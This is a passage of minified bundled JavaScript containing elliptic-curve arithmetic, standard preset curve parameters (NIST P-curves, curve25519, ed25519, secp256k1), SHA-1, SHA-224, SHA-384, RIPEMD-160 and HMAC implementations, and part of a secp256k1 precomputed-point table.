            r = n.redMul(this.d).redAdd(this.one),
            o = i.redMul(r.redInvm()); if (0 === o.cmp(this.zero)) { if (t) throw new Error("invalid point"); return this.point(this.zero, e) } var a = o.redSqrt(); if (0 !== a.redSqr().redSub(o).cmp(this.zero)) throw new Error("invalid point"); return a.isOdd() !== t && (a = a.redNeg()), this.point(a, e) }, i.prototype.validate = function(e) { if (e.isInfinity()) return !0;
        e.normalize(); var t = e.x.redSqr(),
            n = e.y.redSqr(),
            i = t.redMul(this.a).redAdd(n),
            r = this.c2.redMul(this.one.redAdd(this.d.redMul(t).redMul(n))); return 0 === i.cmp(r) }, c(r, u.BasePoint), i.prototype.pointFromJSON = function(e) { return r.fromJSON(this, e) }, i.prototype.point = function(e, t, n, i) { return new r(this, e, t, n, i) }, r.fromJSON = function(e, t) { return new r(e, t[0], t[1], t[2]) }, r.prototype.inspect = function() { return this.isInfinity() ? "<EC Point Infinity>" : "<EC Point x: " + this.x.fromRed().toString(16, 2) + " y: " + this.y.fromRed().toString(16, 2) + " z: " + this.z.fromRed().toString(16, 2) + ">" }, r.prototype.isInfinity = function() { return 0 === this.x.cmpn(0) && 0 === this.y.cmp(this.z) }, r.prototype._extDbl = function() { var e = this.x.redSqr(),
            t = this.y.redSqr(),
            n = this.z.redSqr();
        n = n.redIAdd(n); var i = this.curve._mulA(e),
            r = this.x.redAdd(this.y).redSqr().redISub(e).redISub(t),
            o = i.redAdd(t),
            a = o.redSub(n),
            s = i.redSub(t),
            c = r.redMul(a),
            u = o.redMul(s),
            l = r.redMul(s),
            d = a.redMul(o); return this.curve.point(c, u, d, l) }, r.prototype._projDbl = function() { var e, t, n, i = this.x.redAdd(this.y).redSqr(),
            r = this.x.redSqr(),
            o = this.y.redSqr(); if (this.curve.twisted) { var a = this.curve._mulA(r),
                s = a.redAdd(o); if (this.zOne) e = i.redSub(r).redSub(o).redMul(s.redSub(this.curve.two)), t = s.redMul(a.redSub(o)), n = s.redSqr().redSub(s).redSub(s);
            else { var c = this.z.redSqr(),
                    u = s.redSub(c).redISub(c);
                e = i.redSub(r).redISub(o).redMul(u), t = s.redMul(a.redSub(o)), n = s.redMul(u) } } else { var a = r.redAdd(o),
                c = this.curve._mulC(this.c.redMul(this.z)).redSqr(),
                u = a.redSub(c).redSub(c);
            e = this.curve._mulC(i.redISub(a)).redMul(u), t = this.curve._mulC(a).redMul(r.redISub(o)), n = a.redMul(u) } return this.curve.point(e, t, n) }, r.prototype.dbl = function() { return this.isInfinity() ? this : this.curve.extended ? this._extDbl() : this._projDbl() }, r.prototype._extAdd = function(e) { var t = this.y.redSub(this.x).redMul(e.y.redSub(e.x)),
            n = this.y.redAdd(this.x).redMul(e.y.redAdd(e.x)),
            i = this.t.redMul(this.curve.dd).redMul(e.t),
            r = this.z.redMul(e.z.redAdd(e.z)),
            o = n.redSub(t),
            a = r.redSub(i),
            s = r.redAdd(i),
            c = n.redAdd(t),
            u = o.redMul(a),
            l = s.redMul(c),
            d = o.redMul(c),
            f = a.redMul(s); return this.curve.point(u, l, f, d) }, r.prototype._projAdd = function(e) { var t, n, i = this.z.redMul(e.z),
            r = i.redSqr(),
            o = this.x.redMul(e.x),
            a = this.y.redMul(e.y),
            s = this.curve.d.redMul(o).redMul(a),
            c = r.redSub(s),
            u = r.redAdd(s),
            l = this.x.redAdd(this.y).redMul(e.x.redAdd(e.y)).redISub(o).redISub(a),
            d = i.redMul(c).redMul(l); return this.curve.twisted ? (t = i.redMul(u).redMul(a.redSub(this.curve._mulA(o))), n = c.redMul(u)) : (t = i.redMul(u).redMul(a.redSub(o)), n = this.curve._mulC(c).redMul(u)), this.curve.point(d, t, n) }, r.prototype.add = function(e) { return this.isInfinity() ? e : e.isInfinity() ? this : this.curve.extended ? this._extAdd(e) : this._projAdd(e) }, r.prototype.mul = function(e) { return this._hasDoubles(e) ? this.curve._fixedNafMul(this, e) : this.curve._wnafMul(this, e) }, r.prototype.mulAdd = function(e, t, n) { return this.curve._wnafMulAdd(1, [this, t], [e, n], 2, !1) }, r.prototype.jmulAdd = function(e, t, n) { return this.curve._wnafMulAdd(1, [this, t], [e, n], 2, !0) }, r.prototype.normalize = function() { if (this.zOne) return this; var e = this.z.redInvm(); return this.x = this.x.redMul(e), this.y = this.y.redMul(e), this.t && (this.t = this.t.redMul(e)), this.z = this.curve.one, this.zOne = !0, this }, r.prototype.neg = function() { return this.curve.point(this.x.redNeg(), this.y, this.z, this.t && this.t.redNeg()) }, r.prototype.getX = function() { return this.normalize(), this.x.fromRed() }, r.prototype.getY = function() { return this.normalize(), this.y.fromRed() }, r.prototype.eq = function(e) { return this === e || 0 === this.getX().cmp(e.getX()) && 0 === this.getY().cmp(e.getY()) }, r.prototype.eqXToP = function(e) { var t = e.toRed(this.curve.red).redMul(this.z); if (0 === this.x.cmp(t)) return !0; for (var n = e.clone(), i = this.curve.redN.redMul(this.z);;) { if (n.iadd(this.curve.n), n.cmp(this.curve.p) >= 0) return !1; if (t.redIAdd(i), 0 === this.x.cmp(t)) return !0 } return !1 }, r.prototype.toP = r.prototype.normalize, r.prototype.mixedAdd = r.prototype.add }, function(e, t, n) { "use strict";

    function i(e) { "short" === e.type ? this.curve = new s.curve.short(e) : "edwards" === e.type ? this.curve = new s.curve.edwards(e) : this.curve = new s.curve.mont(e), this.g = this.curve.g, this.n = this.curve.n, this.hash = e.hash, c(this.g.validate(), "Invalid curve"), c(this.g.mul(this.n).isInfinity(), "Invalid curve, G*N != O") }

    function r(e, t) { Object.defineProperty(o, e, { configurable: !0, enumerable: !0, get: function() { var n = new i(t); return Object.defineProperty(o, e, { configurable: !0, enumerable: !0, value: n }), n } }) } var o = t,
        a = n(36),
        s = n(4),
        c = s.utils.assert;
    o.PresetCurve = i, r("p192", { type: "short", prime: "p192", p: "ffffffff ffffffff ffffffff fffffffe ffffffff ffffffff", a: "ffffffff ffffffff ffffffff fffffffe ffffffff fffffffc", b: "64210519 e59c80e7 0fa7e9ab 72243049 feb8deec c146b9b1", n: "ffffffff ffffffff ffffffff 99def836 146bc9b1 b4d22831", hash: a.sha256, gRed: !1, g: ["188da80e b03090f6 7cbf20eb 43a18800 f4ff0afd 82ff1012", "07192b95 ffc8da78 631011ed 6b24cdd5 73f977a1 1e794811"] }), r("p224", { type: "short", prime: "p224", p: "ffffffff ffffffff ffffffff ffffffff 00000000 00000000 00000001", a: "ffffffff ffffffff ffffffff fffffffe ffffffff ffffffff fffffffe", b: "b4050a85 0c04b3ab f5413256 5044b0b7 d7bfd8ba 270b3943 2355ffb4", n: "ffffffff ffffffff ffffffff ffff16a2 e0b8f03e 13dd2945 5c5c2a3d", hash: a.sha256, gRed: !1, g: ["b70e0cbd 6bb4bf7f 321390b9 4a03c1d3 56c21122 343280d6 115c1d21", "bd376388 b5f723fb 4c22dfe6 cd4375a0 5a074764 44d58199 85007e34"] }), r("p256", { type: "short", prime: null, p: "ffffffff 00000001 00000000 00000000 00000000 ffffffff ffffffff ffffffff", a: "ffffffff 00000001 00000000 00000000 00000000 ffffffff ffffffff fffffffc", b: "5ac635d8 aa3a93e7 b3ebbd55 769886bc 651d06b0 cc53b0f6 3bce3c3e 27d2604b", n: "ffffffff 00000000 ffffffff ffffffff bce6faad a7179e84 f3b9cac2 fc632551", hash: a.sha256, gRed: !1, g: ["6b17d1f2 e12c4247 f8bce6e5 63a440f2 77037d81 2deb33a0 f4a13945 d898c296", "4fe342e2 fe1a7f9b 8ee7eb4a 7c0f9e16 2bce3357 6b315ece cbb64068 37bf51f5"] }), r("p384", { type: "short", prime: null, p: "ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffe ffffffff 00000000 00000000 ffffffff", a: "ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffe ffffffff 00000000 00000000 fffffffc", b: "b3312fa7 e23ee7e4 988e056b e3f82d19 181d9c6e fe814112 0314088f 5013875a c656398d 8a2ed19d 2a85c8ed d3ec2aef", n: "ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff c7634d81 f4372ddf 581a0db2 48b0a77a ecec196a ccc52973", hash: a.sha384, gRed: !1, g: ["aa87ca22 be8b0537 8eb1c71e f320ad74 6e1d3b62 8ba79b98 59f741e0 82542a38 5502f25d bf55296c 3a545e38 72760ab7", "3617de4a 96262c6f 5d9e98bf 9292dc29 f8f41dbd 289a147c e9da3113 b5f0b8c0 0a60b1ce 1d7e819d 7a431d7c 90ea0e5f"] }), r("p521", { type: "short", prime: null, p: "000001ff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff", a: "000001ff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffc", b: "00000051 953eb961 8e1c9a1f 929a21a0 b68540ee a2da725b 99b315f3 b8b48991 8ef109e1 56193951 ec7e937b 1652c0bd 3bb1bf07 3573df88 3d2c34f1 ef451fd4 6b503f00", n: "000001ff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffa 51868783 bf2f966b 7fcc0148 f709a5d0 3bb5c9b8 899c47ae bb6fb71e 91386409", hash: a.sha512, gRed: !1, g: ["000000c6 858e06b7 0404e9cd 9e3ecb66 2395b442 9c648139 053fb521 f828af60 6b4d3dba a14b5e77 efe75928 fe1dc127 a2ffa8de 3348b3c1 856a429b f97e7e31 c2e5bd66", "00000118 39296a78 9a3bc004 5c8a5fb4 2c7d1bd9 98f54449 579b4468 17afbd17 273e662c 97ee7299 5ef42640 c550b901 3fad0761 353c7086 a272c240 88be9476 9fd16650"] }), r("curve25519", { type: "mont", prime: "p25519", p: "7fffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffed", a: "76d06", b: "1", n: "1000000000000000 0000000000000000 14def9dea2f79cd6 5812631a5cf5d3ed", hash: a.sha256, gRed: !1, g: ["9"] }), r("ed25519", { type: "edwards", prime: "p25519", p: "7fffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffed", a: "-1", c: "1", d: "52036cee2b6ffe73 8cc740797779e898 00700a4d4141d8ab 75eb4dca135978a3", n: "1000000000000000 0000000000000000 14def9dea2f79cd6 5812631a5cf5d3ed", hash: a.sha256, gRed: !1, g: ["216936d3cd6e53fec0a4e231fdd6dc5c692cc7609525a7b2c9562d608f25d51a", "6666666666666666666666666666666666666666666666666666666666666658"] }); var u; try { u = n(134) } catch (e) { u = void 0 } r("secp256k1", { type: "short", prime: "k256", p: "ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffe fffffc2f", a: "0", b: "7", n: "ffffffff ffffffff ffffffff fffffffe baaedce6 af48a03b bfd25e8c d0364141", h: "1", hash: a.sha256, beta: "7ae96a2b657c07106e64479eac3434e99cf0497512f58995c1396c28719501ee", lambda: "5363ad4cc05c30e0a5261c028812645a122e22ea20816678df02967c1b23bd72", basis: [{ a: "3086d221a7d46bcde86c90e49284eb15", b: "-e4437ed6010e88286f547fa90abfe4c3" }, { a: "114ca50f7a8e2f3f657c1108d9d44cfd8", b: "3086d221a7d46bcde86c90e49284eb15" }], gRed: !1, g: ["79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798", "483ada7726a3c4655da4fbfc0e1108a8fd17b448a68554199c47d08ffb10d4b8", u] }) }, function(e, t, n) { "use strict";
    t.sha1 = n(129), t.sha224 = n(130), t.sha256 = n(60), t.sha384 = n(131), t.sha512 = n(61) }, function(e, t, n) { "use strict";

    function i() { if (!(this instanceof i)) return new i;
        d.call(this), this.h = [1732584193, 4023233417, 2562383102, 271733878, 3285377520], this.W = new Array(80) } var r = n(6),
        o = n(16),
        a = n(59),
        s = r.rotl32,
        c = r.sum32,
        u = r.sum32_5,
        l = a.ft_1,
        d = o.BlockHash,
        f = [1518500249, 1859775393, 2400959708, 3395469782];
    r.inherits(i, d), e.exports = i, i.blockSize = 512, i.outSize = 160, i.hmacStrength = 80, i.padLength = 64, i.prototype._update = function(e, t) { for (var n = this.W, i = 0; i < 16; i++) n[i] = e[t + i]; for (; i < n.length; i++) n[i] = s(n[i - 3] ^ n[i - 8] ^ n[i - 14] ^ n[i - 16], 1); var r = this.h[0],
            o = this.h[1],
            a = this.h[2],
            d = this.h[3],
            h = this.h[4]; for (i = 0; i < n.length; i++) { var p = ~~(i / 20),
                b = u(s(r, 5), l(p, o, a, d), h, n[i], f[p]);
            h = d, d = a, a = s(o, 30), o = r, r = b } this.h[0] = c(this.h[0], r), this.h[1] = c(this.h[1], o), this.h[2] = c(this.h[2], a), this.h[3] = c(this.h[3], d), this.h[4] = c(this.h[4], h) }, i.prototype._digest = function(e) { return "hex" === e ? r.toHex32(this.h, "big") : r.split32(this.h, "big") } }, function(e, t, n) { "use strict";

    function i() { if (!(this instanceof i)) return new i;
        o.call(this), this.h = [3238371032, 914150663, 812702999, 4144912697, 4290775857, 1750603025, 1694076839, 3204075428] } var r = n(6),
        o = n(60);
    r.inherits(i, o), e.exports = i, i.blockSize = 512, i.outSize = 224, i.hmacStrength = 192, i.padLength = 64, i.prototype._digest = function(e) { return "hex" === e ? r.toHex32(this.h.slice(0, 7), "big") : r.split32(this.h.slice(0, 7), "big") } }, function(e, t, n) { "use strict";

    function i() { if (!(this instanceof i)) return new i;
        o.call(this), this.h = [3418070365, 3238371032, 1654270250, 914150663, 2438529370, 812702999, 355462360, 4144912697, 1731405415, 4290775857, 2394180231, 1750603025, 3675008525, 1694076839, 1203062813, 3204075428] } var r = n(6),
        o = n(61);
    r.inherits(i, o), e.exports = i, i.blockSize = 1024, i.outSize = 384, i.hmacStrength = 192, i.padLength = 128, i.prototype._digest = function(e) { return "hex" === e ? r.toHex32(this.h.slice(0, 12), "big") : r.split32(this.h.slice(0, 12), "big") } }, function(e, t, n) { "use strict";

    function i() { if (!(this instanceof i)) return new i;
        h.call(this), this.h = [1732584193, 4023233417, 2562383102, 271733878, 3285377520], this.endian = "little" }

    function r(e, t, n, i) { return e <= 15 ? t ^ n ^ i : e <= 31 ? t & n | ~t & i : e <= 47 ? (t | ~n) ^ i : e <= 63 ? t & i | n & ~i : t ^ (n | ~i) }

    function o(e) { return e <= 15 ? 0 : e <= 31 ? 1518500249 : e <= 47 ? 1859775393 : e <= 63 ? 2400959708 : 2840853838 }

    function a(e) { return e <= 15 ? 1352829926 : e <= 31 ? 1548603684 : e <= 47 ? 1836072691 : e <= 63 ? 2053994217 : 0 } var s = n(6),
        c = n(16),
        u = s.rotl32,
        l = s.sum32,
        d = s.sum32_3,
        f = s.sum32_4,
        h = c.BlockHash;
    s.inherits(i, h), t.ripemd160 = i, i.blockSize = 512, i.outSize = 160, i.hmacStrength = 192, i.padLength = 64, i.prototype._update = function(e, t) { for (var n = this.h[0], i = this.h[1], s = this.h[2], c = this.h[3], h = this.h[4], v = n, y = i, w = s, x = c, S = h, _ = 0; _ < 80; _++) { var k = l(u(f(n, r(_, i, s, c), e[p[_] + t], o(_)), m[_]), h);
            n = h, h = c, c = u(s, 10), s = i, i = k, k = l(u(f(v, r(79 - _, y, w, x), e[b[_] + t], a(_)), g[_]), S), v = S, S = x, x = u(w, 10), w = y, y = k } k = d(this.h[1], s, x), this.h[1] = d(this.h[2], c, S), this.h[2] = d(this.h[3], h, v), this.h[3] = d(this.h[4], n, y), this.h[4] = d(this.h[0], i, w), this.h[0] = k }, i.prototype._digest = function(e) { return "hex" === e ? s.toHex32(this.h, "little") : s.split32(this.h, "little") }; var p = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 7, 4, 13, 1, 10, 6, 15, 3, 12, 0, 9, 5, 2, 14, 11, 8, 3, 10, 14, 4, 9, 15, 8, 1, 2, 7, 0, 6, 13, 11, 5, 12, 1, 9, 11, 10, 0, 8, 12, 4, 13, 3, 7, 15, 14, 5, 6, 2, 4, 0, 5, 9, 7, 12, 2, 10, 14, 1, 3, 8, 11, 6, 15, 13],
        b = [5, 14, 7, 0, 9, 2, 11, 4, 13, 6, 15, 8, 1, 10, 3, 12, 6, 11, 3, 7, 0, 13, 5, 10, 14, 15, 8, 12, 4, 9, 1, 2, 15, 5, 1, 3, 7, 14, 6, 9, 11, 8, 12, 2, 10, 0, 4, 13, 8, 6, 4, 1, 3, 11, 15, 0, 5, 12, 2, 13, 9, 7, 10, 14, 12, 15, 10, 4, 1, 5, 8, 7, 6, 2, 13, 14, 0, 3, 9, 11],
        m = [11, 14, 15, 12, 5, 8, 7, 9, 11, 13, 14, 15, 6, 7, 9, 8, 7, 6, 8, 13, 11, 9, 7, 15, 7, 12, 15, 9, 11, 7, 13, 12, 11, 13, 6, 7, 14, 9, 13, 15, 14, 8, 13, 6, 5, 12, 7, 5, 11, 12, 14, 15, 14, 15, 9, 8, 9, 14, 5, 6, 8, 6, 5, 12, 9, 15, 5, 11, 6, 8, 13, 12, 5, 12, 13, 14, 11, 8, 5, 6],
        g = [8, 9, 9, 11, 13, 15, 15, 5, 7, 7, 8, 11, 14, 14, 12, 6, 9, 13, 15, 7, 12, 8, 9, 11, 7, 7, 12, 7, 6, 15, 13, 11, 9, 7, 15, 11, 8, 6, 6, 14, 12, 13, 5, 14, 13, 13, 7, 5, 15, 5, 8, 11, 14, 14, 6, 14, 6, 9, 12, 9, 12, 5, 15, 8, 8, 5, 12, 9, 12, 5, 14, 6, 8, 13, 6, 5, 15, 13, 11, 11] }, function(e, t, n) { "use strict";

    function i(e, t, n) { if (!(this instanceof i)) return new i(e, t, n);
        this.Hash = e, this.blockSize = e.blockSize / 8, this.outSize = e.outSize / 8, this.inner = null, this.outer = null, this._init(r.toArray(t, n)) } var r = n(6),
        o = n(5);
    e.exports = i, i.prototype._init = function(e) { e.length > this.blockSize && (e = (new this.Hash).update(e).digest()), o(e.length <= this.blockSize); for (var t = e.length; t < this.blockSize; t++) e.push(0); for (t = 0; t < e.length; t++) e[t] ^= 54; for (this.inner = (new this.Hash).update(e), t = 0; t < e.length; t++) e[t] ^= 106;
        this.outer = (new this.Hash).update(e) }, i.prototype.update = function(e, t) { return this.inner.update(e, t), this }, i.prototype.digest = function(e) { return this.outer.update(this.inner.digest()), this.outer.digest(e) } }, function(e, t) { e.exports = { doubles: { step: 4, points: [
                ["e60fce93b59e9ec53011aabc21c23e97b2a31369b87a5ae9c44ee89e2a6dec0a", "f7e3507399e595929db99f34f57937101296891e44d23f0be1f32cce69616821"],
                ["8282263212c609d9ea2a6e3e172de238d8c39cabd5ac1ca10646e23fd5f51508", "11f8a8098557dfe45e8256e830b60ace62d613ac2f7b17bed31b6eaff6e26caf"],
                ["175e159f728b865a72f99cc6c6fc846de0b93833fd2222ed73fce5b551e5b739", "d3506e0d9e3c79eba4ef97a51ff71f5eacb5955add24345c6efa6ffee9fed695"],
                ["363d90d447b00c9c99ceac05b6262ee053441c7e55552ffe526bad8f83ff4640", "4e273adfc732221953b445397f3363145b9a89008199ecb62003c7f3bee9de9"],
                ["8b4b5f165df3c2be8c6244b5b745638843e4a781a15bcd1b69f79a55dffdf80c", "4aad0a6f68d308b4b3fbd7813ab0da04f9e336546162ee56b3eff0c65fd4fd36"],
                ["723cbaa6e5db996d6bf771c00bd548c7b700dbffa6c0e77bcb6115925232fcda", "96e867b5595cc498a921137488824d6e2660a0653779494801dc069d9eb39f5f"],
                ["eebfa4d493bebf98ba5feec812c2d3b50947961237a919839a533eca0e7dd7fa", "5d9a8ca3970ef0f269ee7edaf178089d9ae4cdc3a711f712ddfd4fdae1de8999"],
                ["100f44da696e71672791d0a09b7bde459f1215a29b3c03bfefd7835b39a48db0", "cdd9e13192a00b772ec8f3300c090666b7ff4a18ff5195ac0fbd5cd62bc65a09"],
                ["e1031be262c7ed1b1dc9227a4a04c017a77f8d4464f3b3852c8acde6e534fd2d", "9d7061928940405e6bb6a4176597535af292dd419e1ced79a44f18f29456a00d"],
                ["feea6cae46d55b530ac2839f143bd7ec5cf8b266a41d6af52d5e688d9094696d", "e57c6b6c97dce1bab06e4e12bf3ecd5c981c8957cc41442d3155debf18090088"],
                ["da67a91d91049cdcb367be4be6ffca3cfeed657d808583de33fa978bc1ec6cb1", "9bacaa35481642bc41f463f7ec9780e5dec7adc508f740a17e9ea8e27a68be1d"],
                ["53904faa0b334cdda6e000935ef22151ec08d0f7bb11069f57545ccc1a37b7c0", "5bc087d0bc80106d88c9eccac20d3c1c13999981e14434699dcb096b022771c8"],
                ["8e7bcd0bd35983a7719cca7764ca906779b53a043a9b8bcaeff959f43ad86047", "10b7770b2a3da4b3940310420ca9514579e88e2e47fd68b3ea10047e8460372a"],
                ["385eed34c1cdff21e6d0818689b81bde71a7f4f18397e6690a841e1599c43862", "283bebc3e8ea23f56701de19e9ebf4576b304eec2086dc8cc0458fe5542e5453"],
                ["6f9d9b803ecf191637c73a4413dfa180fddf84a5947fbc9c606ed86c3fac3a7", "7c80c68e603059ba69b8e2a30e45c4d47ea4dd2f5c281002d86890603a842160"],
                ["3322d401243c4e2582a2147c104d6ecbf774d163db0f5e5313b7e0e742d0e6bd", "56e70797e9664ef5bfb019bc4ddaf9b72805f63ea2873af624f3a2e96c28b2a0"],
                ["85672c7d2de0b7da2bd1770d89665868741b3f9af7643397721d74d28134ab83", "7c481b9b5b43b2eb6374049bfa62c2e5e77f17fcc5298f44c8e3094f790313a6"],
                ["948bf809b1988a46b06c9f1919413b10f9226c60f668832ffd959af60c82a0a", "53a562856dcb6646dc6b74c5d1c3418c6d4dff08c97cd2bed4cb7f88d8c8e589"],
                ["6260ce7f461801c34f067ce0f02873a8f1b0e44dfc69752accecd819f38fd8e8", "bc2da82b6fa5b571a7f09049776a1ef7ecd292238051c198c1a84e95b2b4ae17"],
                ["e5037de0afc1d8d43d8348414bbf4103043ec8f575bfdc432953cc8d2037fa2d", "4571534baa94d3b5f9f98d09fb990bddbd5f5b03ec481f10e0e5dc841d755bda"],
                ["e06372b0f4a207adf5ea905e8f1771b4e7e8dbd1c6a6c5b725866a0ae4fce725", "7a908974bce18cfe12a27bb2ad5a488cd7484a7787104870b27034f94eee31dd"],
                ["213c7a715cd5d45358d0bbf9dc0ce02204b10bdde2a3f58540ad6908d0559754", "4b6dad0b5ae462507013ad06245ba190bb4850f5f36a7eeddff2c27534b458f2"],
                ["4e7c272a7af4b34e8dbb9352a5419a87e2838c70adc62cddf0cc3a3b08fbd53c", "17749c766c9d0b18e16fd09f6def681b530b9614bff7dd33e0b3941817dcaae6"],
                ["fea74e3dbe778b1b10f238ad61686aa5c76e3db2be43057632427e2840fb27b6", "6e0568db9b0b13297cf674deccb6af93126b596b973f7b77701d3db7f23cb96f"],
                ["76e64113f677cf0e10a2570d599968d31544e179b760432952c02a4417bdde39", "c90ddf8dee4e95cf577066d70681f0d35e2a33d2b56d2032b4b1752d1901ac01"],
                ["c738c56b03b2abe1e8281baa743f8f9a8f7cc643df26cbee3ab150242bcbb891", "893fb578951ad2537f718f2eacbfbbbb82314eef7880cfe917e735d9699a84c3"],
                ["d895626548b65b81e264c7637c972877d1d72e5f3a925014372e9f6588f6c14b", "febfaa38f2bc7eae728ec60818c340eb03428d632bb067e179363ed75d7d991f"],
                ["b8da94032a957518eb0f6433571e8761ceffc73693e84edd49150a564f676e03", "2804dfa44805a1e4d7c99cc9762808b092cc584d95ff3b511488e4e74efdf6e7"],
                ["e80fea14441fb33a7d8adab9475d7fab2019effb5156a792f1a11778e3c0df5d", "eed1de7f638e00771e89768ca3ca94472d155e80af322ea9fcb4291b6ac9ec78"],
                ["a301697bdfcd704313ba48e51d567543f2a182031efd6915ddc07bbcc4e16070", "7370f91cfb67e4f5081809fa25d40f9b1735dbf7c0a11a130c0d1a041e177ea1"],
                ["90ad85b389d6b936463f9d0512678de208cc330b11307fffab7ac63e3fb04ed4", "e507a3620a38261affdcbd9427222b839aefabe1582894d991d4d48cb6ef150"],
                ["8f68b9d2f63b5f339239c1ad981f162ee88c5678723ea3351b7b444c9ec4c0da", "662a9f2dba063986de1d90c2b6be215dbbea2cfe95510bfdf23cbf79501fff82"],
                ["e4f3fb0176af85d65ff99ff9198c36091f48e86503681e3e6686fd5053231e11", "1e63633ad0ef4f1c1661a6d0ea02b7286cc7e74ec951d1c9822c38576feb73bc"],
                ["8c00fa9b18ebf331eb961537a45a4266c7034f2f0d4e1d0716fb6eae20eae29e", "efa47267fea521a1a9dc343a3736c974c2fadafa81e36c54e7d2a4c66702414b"],
                ["e7a26ce69dd4829f3e10cec0a9e98ed3143d084f308b92c0997fddfc60cb3e41", "2a758e300fa7984b471b006a1aafbb18d0a6b2c0420e83e20e8a9421cf2cfd51"],
                ["b6459e0ee3662ec8d23540c223bcbdc571cbcb967d79424f3cf29eb3de6b80ef", "67c876d06f3e06de1dadf16e5661db3c4b3ae6d48e35b2ff30bf0b61a71ba45"],
                ["d68a80c8280bb840793234aa118f06231d6f1fc67e73c5a5deda0f5b496943e8", "db8ba9fff4b586d00c4b1f9177b0e28b5b0e7b8f7845295a294c84266b133120"],
                ["324aed7df65c804252dc0270907a30b09612aeb973449cea4095980fc28d3d5d", "648a365774b61f2ff130c0c35aec1f4f19213b0c7e332843967224af96ab7c84"],
                ["4df9c14919cde61f6d51dfdbe5fee5dceec4143ba8d1ca888e8bd373fd054c96", "35ec51092d8728050974c23a1d85d4b5d506cdc288490192ebac06cad10d5d"],
                ["9c3919a84a474870faed8a9c1cc66021523489054d7f0308cbfc99c8ac1f98cd", "ddb84f0f4a4ddd57584f044bf260e641905326f76c64c8e6be7e5e03d4fc599d"],
                ["6057170b1dd12fdf8de05f281d8e06bb91e1493a8b91d4cc5a21382120a959e5", "9a1af0b26a6a4807add9a2daf71df262465152bc3ee24c65e899be932385a2a8"],
                ["a576df8e23a08411421439a4518da31880cef0fba7d4df12b1a6973eecb94266", "40a6bf20e76640b2c92b97afe58cd82c432e10a7f514d9f3ee8be11ae1b28ec8"],
                ["7778a78c28dec3e30a05fe9629de8c38bb30d1f5cf9a3a208f763889be58ad71", "34626d9ab5a5b22ff7098e12f2ff580087b38411ff24ac563b513fc1fd9f43ac"],
                ["928955ee637a84463729fd30e7afd2ed5f96274e5ad7e5cb09eda9c06d903ac", "c25621003d3f42a827b78a13093a95eeac3d26efa8a8d83fc5180e935bcd091f"],
                ["85d0fef3ec6db109399064f3a0e3b2855645b4a907ad354527aae75163d82751", "1f03648413a38c0be29d496e582cf5663e8751e96877331582c237a24eb1f962"],
                ["ff2b0dce97eece97c1c9b6041798b85dfdfb6d8882da20308f5404824526087e", "493d13fef524ba188af4c4dc54d07936c7b7ed6fb90e2ceb2c951e01f0c29907"],
                ["827fbbe4b1e880ea9ed2b2e6301b212b57f1ee148cd6dd28780e5e2cf856e241", "c60f9c923c727b0b71bef2c67d1d12687ff7a63186903166d605b68baec293ec"],
                ["eaa649f21f51bdbae7be4ae34ce6e5217a58fdce7f47f9aa7f3b58fa2120e2b3", "be3279ed5bbbb03ac69a80f89879aa5a01a6b965f13f7e59d47a5305ba5ad93d"],
                ["e4a42d43c5cf169d9391df6decf42ee541b6d8f0c9a137401e23632dda34d24f", "4d9f92e716d1c73526fc99ccfb8ad34ce886eedfa8d8e4f13a7f7131deba9414"],
                ["1ec80fef360cbdd954160fadab352b6b92b53576a88fea4947173b9d4300bf19", "aeefe93756b5340d2f3a4958a7abbf5e0146e77f6295a07b671cdc1cc107cefd"],
                ["146a778c04670c2f91b00af4680dfa8bce3490717d58ba889ddb5928366642be", "b318e0ec3354028add669827f9d4b2870aaa971d2f7e5ed1d0b297483d83efd0"],
                ["fa50c0f61d22e5f07e3acebb1aa07b128d0012209a28b9776d76a8793180eef9", "6b84c6922397eba9b72cd2872281a68a5e683293a57a213b38cd8d7d3f4f2811"],
                ["da1d61d0ca721a11b1a5bf6b7d88e8421a288ab5d5bba5220e53d32b5f067ec2", "8157f55a7c99306c79c0766161c91e2966a73899d279b48a655fba0f1ad836f1"],
                ["a8e282ff0c9706907215ff98e8fd416615311de0446f1e062a73b0610d064e13", "7f97355b8db81c09abfb7f3c5b2515888b679a3e50dd6bd6cef7c73111f4cc0c"],
                ["174a53b9c9a285872d39e56e6913cab15d59b1fa512508c022f382de8319497c", "ccc9dc37abfc9c1657b4155f2c47f9e6646b3a1d8cb9854383da13ac079afa73"],
                ["959396981943785c3d3e57edf5018cdbe039e730e4918b3d884fdff09475b7ba", "2e7e552888c331dd8ba0386a4b9cd6849c653f64c8709385e9b8abf87524f2fd"],
                ["d2a63a50ae401e56d645a1153b109a8fcca0a43d561fba2dbb51340c9d82b151", "e82d86fb6443fcb7565aee58b2948220a70f750af484ca52d4142174dcf89405"],
                ["64587e2335471eb890ee7896d7cfdc866bacbdbd3839317b3436f9b45617e073", "d99fcdd5bf6902e2ae96dd6447c299a185b90a39133aeab358299e5e9faf6589"],
                ["8481bde0e4e4d885b3a546d3e549de042f0aa6cea250e7fd358d6c86dd45e458", "38ee7b8cba5404dd84a25bf39cecb2ca900a79c42b262e556d64b1b59779057e"],
                ["13464a57a78102aa62b6979ae817f4637ffcfed3c4b1ce30bcd6303f6caf666b", "69be159004614580ef7e433453ccb0ca48f300a81d0942e13f495a907f6ecc27"],
                ["bc4a9df5b713fe2e9aef430bcc1dc97a0cd9ccede2f28588cada3a0d2d83f366", "d3a81ca6e785c06383937adf4b798caa6e8a9fbfa547b16d758d666581f33c1"],
                ["8c28a97bf8298bc0d23d8c749452a32e694b65e30a9472a3954ab30fe5324caa", "40a30463a3305193378fedf31f7cc0eb7ae784f0451cb9459e71dc73cbef9482"],
